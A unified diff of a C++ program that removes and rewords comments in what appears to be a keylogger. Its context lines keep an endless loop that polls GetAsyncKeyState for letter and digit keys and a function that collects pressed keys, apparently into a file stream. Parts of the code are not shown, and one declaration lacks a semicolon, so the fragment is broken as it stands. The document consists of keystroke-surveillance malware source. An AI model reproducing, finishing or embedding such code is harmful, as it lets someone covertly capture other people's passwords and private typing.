@@ -4,17 +4,11 @@
 
 using namespace std;
 
-//global variables
 ofstream out;
 string buffer;
 int counter
-//global variables
 
-//keylist prototype
 void keylist(char key);
-//keylist prototype
-
-/***************Main****************/
 
 int main()
 {
@@ -22,7 +16,7 @@ int main()
    char chType[]="ABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890";
    
 
-   //the while-loop to check the key state every 100 milliseconds
+   // Check key state every 100 milliseconds
    while(1==1)
    {
       for (int i=0; i<36; i++)
@@ -55,12 +49,8 @@ int main()
    }
 }
 
-/***************Main****************/
-
-//keylist function
 void keylist(char key)
 {
-   //check if the user presses a key
    if(GetAsyncKeyState(key))
    {
       string skey = key;
@@ -69,4 +59,3 @@ void keylist(char key)
       
    }
 }
-//keylist function
